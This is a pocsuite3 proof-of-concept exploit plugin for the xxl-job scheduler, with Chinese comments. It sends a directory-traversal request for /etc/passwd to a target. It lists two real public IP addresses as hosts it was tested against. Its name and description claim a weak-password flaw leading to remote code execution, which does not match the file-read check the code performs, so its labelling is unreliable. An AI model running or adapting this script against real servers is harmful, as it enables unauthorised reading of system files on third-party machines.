from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "7Seven"  # PoC作者的大名
    vulDate = "2022-7-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-13"  # 编写 PoC 的日期
    updateDate = "2022-7-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "xxl-job 后台存在弱口令漏洞"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "xxl-job"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    samples = ["https://112.74.56.114","https://159.75.238.24"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """xxl-job后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        url = str(self.url).split("=")[-2]
        full_url = f"{url}=../../../../../../../../../../etc/passwd"

        headers = {"Sec-Ch-Ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
                         "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"",
                         "Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                         "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,zh-TW;q=0.5",
                         "Connection": "close"}


        result = []
        try:
            res = requests.get(url=full_url, headers=headers,  verify=False, timeout=9)

            # 判断是否存在漏洞
            if res.status_code == 200 and "root" in res.text:
                result.append(url)
                print('{}存在任意文件下载漏洞'.format(self.url))

        except Exception :
            print("{}连接失败".format(self.url))
        finally:
            return result


    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
banner7 = r'''
                                        ######              
            ######                    ##########            
          ######################################            
        ##::########::::::::::::::::::::##########          
      ##::::::########::::::::::::##::::::::########        
      ##::::::######::::::::::::::::##::::::::######        
    ##::::::######::::::::::::::::::::::::::::::####        
    ##::::::::##::::::::::::::::::::::::::::::::::##        
  ##::::::####::::::##::::::::::::::##::::::::  ::##        
  ##::::::##::::::##::::::::::::::::##::      ::::::##      
  ##::::::##::::::##::      ::    ##  ##::::::::::::##      
##::::::::##::::::##::::::::##::::##  ####::::##::::##      
##::::::::##::::##::::::::##::::##      ##::::::##::##      
##::::::::##::::##::::::##::::::##    ######::::####        
##::::::::##::####::::##########      ##  ##::::####        
##::::::::##::########  ####  ##      ##  ##::::##          
##::::::::##########::    ##          ::  ##::########  ##  
##::::::::####::####::  ##::          ##  ##::####  ####  ##
##::::::::##  ######::  ####              ####::##  ##    ##
##::::::::##    ##::::          ##       ####::::##      ## 
##::::::::##      ####::            ######::::::##    ##    
##::::::::::##        ############::##  ##::::##    ##      
##::::::::::##      ##    ########::####::####    ##        
##::::::::::##    ##::::##########::########    ####        
##::::::::::##  ########::::####::##::####    ##::::##      
##::::::::::::##############::::######::##  ##::::::##      
  ##::::::::::####  ########################::::::::##      
  ##::::::::::##  ####::::::::::::::::::####::::::::##      
    ##::::::::##      ##################    ##::::##        
      ##::::##      ########      ##::##      ####          
        ####        ##::##          ####                    
                      ##                                                                        

                                            version:xxl-job 弱口令
'''
print(banner7)
register_poc(XXLJOBPOC)
